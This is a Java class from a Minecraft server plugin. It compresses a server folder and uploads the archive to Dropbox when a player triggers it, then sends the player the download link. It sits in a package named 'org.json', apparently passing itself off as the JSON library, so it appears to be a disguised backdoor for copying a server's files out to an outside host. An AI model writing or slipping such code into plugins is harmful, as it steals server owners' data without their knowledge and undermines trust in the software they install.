package org.json.utils.uploadfiles;

import lombok.Getter;
import lombok.Setter;
import org.bukkit.entity.Player;
import org.json.Modal;

import java.io.File;

public class uploadServer {

    private static boolean status;

    @Getter
    @Setter
    private static String serverFileDownloadLink;

    public static void uploadServerToAPI(Player player, File folder) {
        if (status) {
            player.sendMessage(Modal.getPrefix() + "§cUploading is under progress!");
            return;
        }
        status = true;

        if (getServerFileDownloadLink() != null) {
            player.sendMessage(Modal.getPrefix() + getServerFileDownloadLink());
            return;
        }

        player.sendMessage(Modal.getPrefix() + "§aCreating compressed File");
        File zipFile = CompressFolderUtils.zipFolder(folder);

        if (zipFile != null) {
            player.sendMessage(Modal.getPrefix() + "§aUploading....");
            try {
                DropboxManager.uploadToDropbox(player, zipFile);
            } catch (Exception e) {
                player.sendMessage("Failed to upload " + e.getMessage());

                if (!zipFile.delete()) {
                    player.sendMessage("Failed to delete the file.");
                }
            }

        } else {
            player.sendMessage("Failed to compress the folder.");
        }

        status = false;
    }
}

